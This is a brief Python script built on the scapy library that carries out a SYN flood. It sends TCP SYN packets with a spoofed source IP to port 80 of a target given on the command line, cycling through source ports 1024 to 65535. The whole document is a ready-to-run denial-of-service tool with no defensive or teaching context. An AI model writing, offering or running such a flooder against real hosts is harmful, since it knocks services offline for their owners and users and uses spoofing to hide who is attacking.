import sys
from scapy.all import IP, TCP, send

if len(sys.argv) < 3:
    print(sys.argv[0] + " <spoofed_source_ip> <target>")
    sys.exit(0)

spoofed_ip = sys.argv[1]
target_ip = sys.argv[2]

# Define a range of source ports for the SYN flood
source_ports = range(1024, 65536)

# Send SYN packets with spoofed source IP and different source ports
for sport in source_ports:
    packet = IP(src=spoofed_ip, dst=target_ip) / TCP(sport=sport, dport=80, flags="S")
    send(packet, verbose=False)
    print(f"Sent SYN packet from {spoofed_ip}:{sport} to {target_ip}:80")

print("SYN flood complete.")
